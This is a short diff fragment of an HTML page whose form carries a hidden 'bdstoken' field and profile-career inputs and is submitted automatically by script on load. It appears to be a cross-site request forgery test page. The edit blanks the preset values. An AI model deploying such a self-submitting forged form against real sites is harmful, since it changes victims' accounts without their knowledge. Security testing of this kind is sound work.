@@ -7,11 +7,11 @@ hello world!
     <input type="hidden" name="bdstoken" value="${bdstoken}">
     <input type="hidden" name="tpl" value="pcs">
     <input type="hidden" name="ie" value="utf8">
-    <input type="text" name="passport_career_0_end_month" value="1" />
-    <input type="text" name="passport_career_0_end_year" value="2015" />
-    <input type="text" name="passport_career_0_begin_month" value="9" />
-    <input type="text" name="passport_career_0_begin_year" value="2015" />
-    <input type="text" name="passport_career_0_name" value="hello" />
+    <input type="text" id="passport_career_0_end_month" name = "passport_career_0_end_month" value="" />
+    <input type="text" id="passport_career_0_end_year" name = "passport_career_0_end_year" value="" />
+    <input type="text" id="passport_career_0_begin_month" name = "passport_career_0_begin_month" value="" />
+    <input type="text" id="passport_career_0_begin_year" name = "passport_career_0_begin_year" value="" />
+    <input type="text" id="passport_career_0_name" name = "passport_career_0_name" value="" />
 
 </form>
 <script> document.forms[0].submit(); </script>
